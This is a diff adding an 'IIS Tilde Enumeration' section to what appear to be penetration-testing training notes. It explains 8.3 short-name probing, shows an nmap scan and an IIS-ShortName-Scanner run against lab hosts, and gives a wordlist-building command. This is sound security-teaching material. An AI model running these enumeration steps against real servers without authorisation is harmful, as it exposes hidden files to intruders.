@@ -4,6 +4,11 @@
     - [Attacking ColdFusion](#attacking-coldfusion)
       - [Directory Traversal](#directory-traversal)
       - [Unauthenticated RCE](#unauthenticated-rce)
+  - [IIS Tilde Enumeration](#iis-tilde-enumeration)
+    - [Enumeration](#enumeration-1)
+      - [Tilde Enumeration using IIS ShortName Scanner](#tilde-enumeration-using-iis-shortname-scanner)
+      - [Generate Wordlist](#generate-wordlist)
+      - [Gobuster Enumeration](#gobuster-enumeration)
 
 ---
 
@@ -358,3 +363,137 @@ dir
               15 File(s)      3.339.009 bytes
                2 Dir(s)   1.432.776.704 bytes free
 ```
+
+## IIS Tilde Enumeration
+
+IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names on some versions of Microsoft Internet Information Services web servers. This method takes advantage of a specific vuln in IIS, resulting from how it manages short file names within its directories.
+
+When a file or folder is created on an IIS server, Windows generates a short file name in the 8.3 format, consisting of eight chars for the file name, a period, and three chars for the extension. Intriguingly, these short file names can grant access to their corresponding files and folders, even if they were meant to be hidden or inaccessible.
+
+The tilde char, followed by a sequence number, signifies a short file name in a URL. Hence, if someone determines a file or folder's short file name, they can exploit the tilde char and the short file name in the URL to access sensitive data or hidden resources.
+
+IIS tilde directory enumeration primarily involves sending HTTP requests to the server with distinct char combinations in the URL to identify valid short file names. Once a valid short file name is detected, this information can be utilised to access the relevant resource or further enumerate the directory structure.
+
+The enumeration process starts by sending requests with various chars following the tilde:
+
+```
+http://example.com/~a
+http://example.com/~b
+http://example.com/~c
+...
+```
+
+Assume the server contains a hidden directory named SecretDocuments. When a request is sent to ```http://example.com/~s```, the server replies with a ```200 OK``` status code, revealing a directory with a short name beginning with "s". The enumeration process continues by appending more chars:
+
+```
+http://example.com/~se
+http://example.com/~sf
+http://example.com/~sg
+...
+```
+
+For the request ```http://example.com/~se```, the server returns a ```200 OK``` status code, further refining the short name to be "se". Further requests are sent such as:
+
+```
+http://example.com/~sec
+http://example.com/~sed
+http://example.com/~see
+...
+```
+
+The server delivers a ```200 OK``` status code for the request ```http://example.com/~sec```, further narrowing the short name to "sec".
+
+Continuing this procedure, the short name ```secret~1``` is eventually discovered when the server returns a ```200 OK``` status code for the request ```http://example.com/~secret```.
+
+Once the short name is identified, enumeration of specific file names within that path can be performed, potentially exposing sensitive documents.
+
+For instance, if the short name ```secret~1``` is determined for the concealed directory SecretDocuments, files in that dir can be accessed by submitting requests such as:
+
+```
+http://example.com/secret~1/somefile.txt
+http://example.com/secret~1/anotherfile.docx
+```
+
+The same IIS tilde directory enumeration technique can also detect 8.3 short file names for files within the directory. After obtaining the short names, those files can be directly accessed using the short names in the requests.
+
+```
+http://example.com/secret~1/somefi~1.txt
+```
+
+In 8.3 short file names, such as ```somefi~1.txt```, the number "1" is a unique identifier that distinguishes files with similar names within the same directory. The numbers following the tilde assist the file system in differentiating between files that share similarities in their names, ensuring each file has a distinct 8.3 short file name.
+
+For example, if two files named somefile.txt and somefile1.txt exist in the same directory, their 8.3 short file names would be:
+
+- somefi~1.txt for somefile.txt
+- somefi~2.txt for somefile1.txt
+
+### Enumeration
+
+The initial phase involves mapping the target and determining which services are operating on their respective ports.
+
+```bash
+d41y@htb[/htb]$ nmap -p- -sV -sC --open 10.129.224.91
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 19:44 GMT
+Nmap scan report for 10.129.224.91
+Host is up (0.011s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Bounty
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds
+```
+
+IIS 7.5 is running on port 80. Executing a tilde enumeration attack on this version could be a viable option.
+
+#### Tilde Enumeration using IIS ShortName Scanner
+
+Manually sending HTTP requests for each letter of the alphabet can be a tedious process. Fortunately, there is a tool called [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) that can automate this task. To use it, you will need to install Oracle Java.
+
+When you run the below command, it will prompt you for a proxy, just hit enter for "No".
+
+```bash
+d41y@htb[/htb]$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
+
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Do you want to use proxy [Y=Yes, Anything Else=No]? 
+# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
+Target: http://10.129.204.231/
+|_ Result: Vulnerable!
+|_ Used HTTP method: OPTIONS
+|_ Suffix (magic part): /~1/
+|_ Extra information:
+  |_ Number of sent requests: 553
+  |_ Identified directories: 2
+    |_ ASPNET~1
+    |_ UPLOAD~1
+  |_ Identified files: 3
+    |_ CSASPX~1.CS
+      |_ Actual extension = .CS
+    |_ CSASPX~1.CS??
+    |_ TRANSF~1.ASP
+```
+
+Upon executing the tool, it discovers 2 dirs and 3 files. However, the target does not permit GET access to ```http://10.129.204.231/TRANSF~1.ASP```, necessitating the brute-forcing of the remaining filename.
+
+#### Generate Wordlist
+
+```bash
+d41y@htb[/htb]$ egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
+```
+
+This command combines egrep and sed to filter and modify the contents of input files, then save the results to a new file.
+
+| Command Part | Description |
+| ------------ | ----------- |
+| ```egrep -r ^transf``` | The ```egrep``` command is used to search for lines containing a specific pattern in the input files. The ```-r``` flag indicates a recursive search through dirs. The ```^transf``` pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names. |
+| ```sed 's/ ^[^:]*://'``` | The ```sed``` command is used to perform a find-and-replace operation on its input. The ```'s/ ^[^:]*://'``` expression tells sed to find any sequence of chars at the beginning of a line up to the first colon, and replace them with nothing. The result will be the lines starting with "transf" but without the file names and colons. |
+
+#### Gobuster Enumeration
